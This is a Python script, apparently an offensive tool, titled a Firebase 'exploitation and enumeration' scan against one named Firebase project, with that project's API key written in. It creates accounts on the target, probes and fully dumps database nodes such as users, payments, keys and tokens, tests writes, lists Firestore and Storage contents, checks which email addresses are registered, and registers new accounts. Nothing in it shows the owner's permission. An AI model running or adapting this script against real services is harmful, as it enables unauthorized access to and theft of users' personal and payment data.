#!/usr/bin/env python3
"""
Firebase Deep Scan - Extended exploitation and enumeration
"""
import requests
import json

API_KEY = "AIzaSyAOrhEU4gPb1cij7NTjVvdnx6cOwcy4UKE"
DB_URL = "https://wolf-e99fb-default-rtdb.firebaseio.com"
AUTH_URL = "https://identitytoolkit.googleapis.com/v1"

print("=" * 70)
print("FIREBASE DEEP SCAN - ZERO LOADER V4.4.01")
print("=" * 70)

# Step 1: Create anonymous account
print("\n[1] Creating anonymous account...")
resp = requests.post(f"{AUTH_URL}/accounts:signUp?key={API_KEY}", json={"returnSecureToken": True})
data = resp.json()
token = data.get("idToken", "")
uid = data.get("localId", "")
print(f"    UID: {uid}")
print(f"    Token: {token[:60]}...")

# Step 2: Test authenticated access to all nodes
print("\n[2] Testing authenticated access to database nodes...")
nodes = ["users", "aplikasi", "group_chats", "messages", "notifications", 
         "admins", "keys", "licenses", "payments", "devices", "logs", 
         "config", "settings", "premium", "banned", "versions", "updates",
         "chats", "tokens", "subscriptions", "hwid", "blacklist"]

results = {}
for node in nodes:
    url = f"{DB_URL}/{node}.json?auth={token}&shallow=true"
    resp = requests.get(url)
    status = "ACCESSIBLE" if "error" not in resp.text and resp.text != "null" else ("EMPTY" if resp.text == "null" else "DENIED")
    results[node] = {"status": status, "data": resp.text[:150]}
    marker = "[+]" if status == "ACCESSIBLE" else ("[ ]" if status == "EMPTY" else "[-]")
    print(f"    {marker} /{node}: {status} → {resp.text[:80]}")

# Step 3: Deep read of accessible nodes
print("\n[3] Deep reading accessible nodes...")
for node, info in results.items():
    if info["status"] == "ACCESSIBLE":
        url = f"{DB_URL}/{node}.json?auth={token}"
        resp = requests.get(url)
        print(f"\n    === /{node} (FULL DATA) ===")
        try:
            data = resp.json()
            print(f"    {json.dumps(data, indent=4, ensure_ascii=False)[:2000]}")
        except:
            print(f"    {resp.text[:2000]}")

# Step 4: Test write permissions
print("\n[4] Testing write permissions on various nodes...")
test_data = {"poc": "security_test", "uid": uid}
write_targets = [
    f"users/{uid}",
    f"users/{uid}/test",
    "test_write",
    "public_test",
    f"devices/{uid}",
    f"tokens/{uid}",
]
for target in write_targets:
    url = f"{DB_URL}/{target}.json?auth={token}"
    resp = requests.put(url, json=test_data)
    status = "WRITABLE!" if resp.status_code == 200 and "error" not in resp.text else "Protected"
    marker = "[+] CRITICAL" if status == "WRITABLE!" else "[-]"
    print(f"    {marker} /{target}: {status} (HTTP {resp.status_code})")

# Step 5: Test Firestore
print("\n[5] Testing Firestore access...")
firestore_url = f"https://firestore.googleapis.com/v1/projects/wolf-e99fb/databases/(default)/documents"
resp = requests.get(firestore_url)
print(f"    Firestore root: HTTP {resp.status_code}")
if resp.status_code == 200:
    print(f"    {resp.text[:500]}")

# Test specific Firestore collections
collections = ["users", "licenses", "config", "games", "keys"]
for col in collections:
    resp = requests.get(f"{firestore_url}/{col}")
    if resp.status_code == 200 and "error" not in resp.text.lower():
        print(f"    [+] Firestore /{col}: ACCESSIBLE!")
        print(f"        {resp.text[:200]}")

# Step 6: Test Firebase Storage
print("\n[6] Testing Firebase Storage...")
storage_url = f"https://firebasestorage.googleapis.com/v0/b/wolf-e99fb.appspot.com/o"
resp = requests.get(storage_url)
print(f"    Storage listing: HTTP {resp.status_code}")
if resp.status_code == 200:
    data = resp.json()
    items = data.get("items", [])
    print(f"    Files found: {len(items)}")
    for item in items[:20]:
        print(f"      - {item.get('name', 'unknown')} ({item.get('size', '?')} bytes)")

# Step 7: Test sign-in methods
print("\n[7] Testing available sign-in methods...")
url = f"{AUTH_URL}/accounts:createAuthUri?key={API_KEY}"
test_emails = ["admin@wolf.com", "test@test.com", "admin@admin.com"]
for email in test_emails:
    resp = requests.post(url, json={"identifier": email, "continueUri": "http://localhost"})
    data = resp.json()
    methods = data.get("signinMethods", [])
    registered = data.get("registered", False)
    print(f"    {email}: registered={registered}, methods={methods}")

# Step 8: Enumerate providers
print("\n[8] Testing auth providers...")
url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/getProjectConfig?key={API_KEY}"
resp = requests.get(url)
data = resp.json()
print(f"    Project ID: {data.get('projectId', 'N/A')}")
print(f"    Authorized Domains: {data.get('authorizedDomains', [])}")
providers = data.get("idpConfig", [])
for p in providers:
    print(f"    Provider: {p.get('provider', 'unknown')} - enabled={p.get('enabled', False)}")

# Step 9: Test email/password signup
print("\n[9] Testing email/password signup...")
resp = requests.post(f"{AUTH_URL}/accounts:signUp?key={API_KEY}", 
    json={"email": "poc_test_12345@test.com", "password": "TestPassword123!", "returnSecureToken": True})
data = resp.json()
if "idToken" in data:
    print(f"    [+] CRITICAL: Email/password signup ENABLED!")
    print(f"    [+] Created: {data.get('email', '')}")
    # Delete the account
    requests.post(f"{AUTH_URL}/accounts:delete?key={API_KEY}", json={"idToken": data["idToken"]})
    print(f"    [*] Account deleted after test")
elif "error" in data:
    err = data["error"]
    print(f"    [-] Signup result: {err.get('message', 'unknown')}")

# Step 10: Full aplikasi data
print("\n[10] Full /aplikasi data dump...")
resp = requests.get(f"{DB_URL}/aplikasi.json")
data = resp.json()
print(json.dumps(data, indent=2, ensure_ascii=False))

print("\n" + "=" * 70)
print("SCAN COMPLETE")
print("=" * 70)
